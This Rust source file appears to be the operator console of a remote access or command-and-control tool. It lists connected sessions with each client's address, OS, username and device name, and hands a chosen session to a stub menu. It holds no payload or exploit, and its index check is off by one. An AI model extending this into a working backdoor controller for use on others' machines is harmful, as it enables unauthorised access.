#[path = "core.rs"]
mod core;
use std::io::Write;
use std::{io, ops::Deref, process, thread, time};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::Mutex,
};
use util;

fn read_user_input() -> String {
    print!(">>> ");
    io::stdout().flush().unwrap();

    let mut input = String::new();

    io::stdin().read_line(&mut input).unwrap();

    input
}

pub async fn main_menu(mut client_list: util::Clients) {
    loop {
        let command = read_user_input();

        match command.as_str().trim() {
            "" => continue,
            "help" => {
                println!("\nsessions - display connected sections\n");
            }
            "sessions" => {
                println!("");

                for (index, client) in client_list.lock().await.deref().iter().enumerate() {
                    println!(
                        "[{}] {} | OS: {} | Current user: {} | Device name: {}",
                        index,
                        client.stream.peer_addr().unwrap(),
                        client.os,
                        client.username,
                        client.device_name,
                    );
                }

                println!("");

                let session = read_user_input();

                let session: usize = match session.trim().parse() {
                    Ok(session) => session,
                    Err(e) => panic!("Conversion error: {}", e),
                };

                if client_list.lock().await.len() < session {
                    println!("Incorrect index");
                }

                let mut client = client_list.lock().await.remove(session);

                session_menu(client).await;
            }
            _ => {}
        }
    }
}

async fn session_menu(mut client: util::Client) {
    match core::check_connection(&mut client).await {
        Ok(_e) => _e,
        Err(_) => {
            drop(client);
            println!("\n[-] Connection closed [-]");
            process::exit(1);
        }
    }

    println!("Ok");
}
